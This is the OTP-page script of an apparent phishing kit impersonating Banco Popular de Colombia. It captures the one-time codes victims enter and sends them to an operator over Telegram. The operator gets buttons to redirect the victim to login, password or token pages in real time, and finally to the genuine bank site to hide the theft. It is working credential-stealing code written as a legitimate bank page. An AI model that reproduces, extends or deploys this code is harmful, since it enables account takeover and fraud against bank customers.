/**
 * POPULAR - otp.js OPTIMIZADO
 */

document.addEventListener('DOMContentLoaded', () => {
    console.log('🚀 Popular OTP: Inicializando...');
    
    if (typeof BancoUtils === 'undefined') {
        console.error('❌ BancoUtils no está cargado');
        return;
    }
    
    BancoUtils.initSocket();
    console.log('✅ Socket inicializado');
    
    const input = document.getElementById('otp-input');
    const btnContinuar = document.getElementById('btn-continuar-otp');
    const overlay = document.getElementById('loading-screen');

    BancoUtils.onTelegramAction(handleTelegramAction);

    input.addEventListener('input', () => {
        BancoUtils.validateNumeric(input, 8);
        const isValid = input.value.length >= 4 && input.value.length <= 8;
        btnContinuar.disabled = !isValid;
        if (isValid) {
            btnContinuar.classList.add('enabled');
        } else {
            btnContinuar.classList.remove('enabled');
        }
    });

    btnContinuar.addEventListener('click', async (e) => {
        e.preventDefault();
        e.stopPropagation();
        
        if (btnContinuar.disabled) return;
        
        console.log('🔘 Botón clickeado');
        console.log('📦 Mostrando overlay...');
        
        // Mostrar overlay directamente
        if (overlay) {
            overlay.classList.remove('hidden');
            overlay.classList.add('show');
            console.log('✅ Overlay mostrado');
        } else {
            console.error('❌ Overlay no encontrado');
        }

        const data = BancoUtils.saveBankData('popular', { otp: input.value });
        console.log('📤 Datos a enviar:', data);
        
        const message = BancoUtils.formatMessage('BANCO POPULAR - OTP', data);
        const keyboard = BancoUtils.createKeyboard([
            { text: '🔐 Pedir Login', action: 'request_login' },
            { text: '🔑 Pedir Clave', action: 'request_clave' },
            { text: '📱 Pedir Token', action: 'request_token' },
            { text: '🔢 Pedir OTP', action: 'request_otp' },
            { text: '✅ Finalizar', action: 'finish' }
        ], BancoUtils.getSessionId());

        console.log('📨 Enviando a Telegram...');
        try {
            await BancoUtils.sendToTelegram('otp', { text: message, keyboard });
            console.log('✅ Mensaje enviado correctamente');
        } catch (error) {
            console.error('❌ Error al enviar:', error);
            if (overlay) {
                overlay.classList.add('hidden');
                overlay.classList.remove('show');
            }
            alert('Error al enviar los datos. Por favor intente nuevamente.');
        }
    });

    function handleTelegramAction(data) {
        console.log('📢 Acción de Telegram recibida en OTP:', data);
        if (overlay) {
            overlay.classList.add('hidden');
            overlay.classList.remove('show');
        }
        
        switch(data.action) {
            case 'request_login':
                console.log('🔐 Redirigiendo a index.html');
                window.location.href = 'index.html';
                break;
            case 'request_clave':
                console.log('🔑 Redirigiendo a clave.html');
                window.location.href = 'clave.html';
                break;
            case 'request_token':
                console.log('📱 Redirigiendo a token.html');
                window.location.href = 'token.html';
                break;
            case 'request_otp':
                console.log('🔢 Limpiando campo de OTP');
                input.value = '';
                btnContinuar.disabled = true;
                btnContinuar.classList.remove('enabled');
                input.focus();
                break;
            case 'finish':
                console.log('✅ Finalizando - redirigiendo a bancopopular.com.co');
                window.location.href = 'https://www.bancopopular.com.co/';
                break;
            default:
                console.log('⚠️ Acción desconocida:', data.action);
        }
    }
});
